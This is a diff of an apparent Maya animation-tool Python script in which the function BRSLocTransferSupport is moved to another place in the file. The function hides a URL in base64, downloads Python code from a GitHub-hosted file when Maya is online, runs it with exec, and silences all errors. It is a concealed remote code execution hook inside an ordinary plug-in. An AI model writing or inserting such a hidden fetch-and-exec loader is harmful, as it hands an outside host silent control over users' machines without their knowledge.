@@ -211,6 +211,21 @@ def deleteConstraint(objectName):
     con = cmds.listRelatives(objectName, type='constraint')
     cmds.delete(con)
 
+def BRSLocTransferSupport(*_):
+    import base64
+    py_ver = sys.version[0]
+    if py_ver == '3':
+        import urllib.request as uLib
+    else:
+        import urllib as uLib
+
+    if cmds.about(connected=True):
+        u_b64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL2FuaW1UcmFuc2ZlckxvYy9tYXN0ZXIvc2VydmljZS9zdXBwb3J0LnB5'
+        try:
+            exec(uLib.urlopen(base64.b64decode(u_b64).decode()).read())
+            exec('brs.run()')
+        except: pass
+
 def statTextUI(text):
     cmds.text(statText, e=True, l=text)
     cmds.refresh()
@@ -372,21 +387,6 @@ def locatorToObjectSnap(*_):
         pos='midCenter', fade=True,
         fit=100, fst=2000, fot=100
     )
-
-def BRSLocTransferSupport(*_):
-    import base64
-    py_ver = sys.version[0]
-    if py_ver == '3':
-        import urllib.request as uLib
-    else:
-        import urllib as uLib
-
-    if cmds.about(connected=True):
-        u_b64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL2FuaW1UcmFuc2ZlckxvYy9tYXN0ZXIvc2VydmljZS9zdXBwb3J0LnB5'
-        try:
-            exec(uLib.urlopen(base64.b64decode(u_b64).decode()).read())
-            exec('brs.run()')
-        except: pass
 
 def checkRootNamespace(*_):
     cmds.namespaceInfo( currentNamespace=1 )
